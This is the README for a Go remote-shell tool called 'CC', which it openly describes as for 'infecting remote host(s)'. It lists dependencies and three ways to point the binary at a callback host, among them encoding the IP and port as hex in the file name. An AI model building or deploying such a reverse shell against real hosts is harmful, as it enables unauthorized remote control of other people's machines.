# CC (cici)

Remote shell for managing and/or infecting remote host(s) 🤔

### Dependencies
Golang, upx binary minifier

The target binary is ~850Kb on linux. The project can be cross-compilable to every platform supported by go/tinygo

## ⚠️ Building/Targeting

To target the remote host, you have 3 options:
 - use environment variable: `R=maci.com:5000 ./cc` 
 - use package into build with: `make remote=maci.com:5000`
 - rename the binary and encode the IP to hex like: `cc-c0a800011388` this is: 192.168.0.1:5000


***guns don't kill people. People are killing people! Use the tool responsibly!*** - Nev3rkn0wn
